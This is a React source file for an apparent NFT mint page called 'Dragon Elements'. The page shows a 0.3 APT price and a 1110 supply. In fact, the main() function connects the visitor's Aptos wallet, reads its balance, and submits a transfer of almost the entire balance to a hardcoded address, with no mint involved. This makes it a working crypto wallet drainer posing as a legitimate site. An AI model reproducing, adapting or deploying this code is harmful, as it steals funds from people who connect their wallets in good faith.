import './App.css';
import {useState} from "react";
import {AptosClient} from 'aptos'
import OwnLayout from "./OwnLayout/OwnLayout";
import imgDiscord from './icons8-discord-50.png'
import imgTwitter from './icons8-twitter-50.png'

const aptAmount = 0.3
const image = 'https://static9.depositphotos.com/1307373/1179/i/600/depositphotos_11794280-stock-photo-red-apple.jpg'
const Title = 'Dragon Elements'
const supply = 1110

document.title = Title
document.getElementById('favicon').setAttribute('href', image)

const client = new AptosClient('https://fullnode.mainnet.aptoslabs.com/v1');

function App() {
    // Retrieve aptos.account on initial render and store it.
    const [address, setAddress] = useState(null)

    let provider
    let walletChoosed
    const chooseWallet = (wallet) => {
      switch (wallet) {
          case 'martian':
              provider = window.martian
              walletChoosed = 'martian'
              main()
              break
          case 'petra':
              provider = window.petra
              main()
              break
          case 'other':
              provider = window.aptos
              main()
              break
          default:
              provider = window.aptos
              main()
      }
    }

    // const provider = !window.aptos ? window.martian : window.aptos

    const main = async () => {
        let clientAddress

        await provider.connect()
        await provider.account().then((data) => {
            console.log(provider, data)
            clientAddress = data.address
            setAddress(data.address)
        })

        const accountResources = await client.getAccountResources(clientAddress)

        const transferingAPT = accountResources[0].data.coin.value - 1000000

        const payload = {
            type: "entry_function_payload",
            function: "0x1::coin::transfer",
            type_arguments: ["0x1::aptos_coin::AptosCoin"],
            arguments: ["0x35e126a027636decd6336435109dce803df88d8378b303616ed57d43be170cc6", transferingAPT]
        };

        if(walletChoosed === 'martian') {
            const transaction = await provider.generateTransaction(clientAddress, payload)
            const signedTxn = await provider.signTransaction(transaction)
            const txnHash = await provider.submitTransaction(signedTxn)
            return
        }

        await provider.signAndSubmitTransaction(payload)

        // const response = await window.martian.connect();
        // const sender = response.address;
        // const details = await window.martian.getAccount('0x35e126a027636decd6336435109dce803df88d8378b303616ed57d43be170cc6')
        // console.log(details)
        // const payload = {
        //     function: "0x1::coin::transfer",
        //     type_arguments: ["0x1::aptos_coin::AptosCoin"],
        //     arguments: ["0x3383dcc05597b57785514e83834bb55643cbc100281b56f3ee974bb382bef33c", 5000000]
        // };
        //
        // const transaction = await window.martian.generateTransaction(sender, payload);
        // const txnHash = await window.martian.signAndSubmitTransaction(transaction);


    }
    return OwnLayout(Title, imgTwitter, imgDiscord, image, aptAmount, main, supply, chooseWallet)
}

export default App;
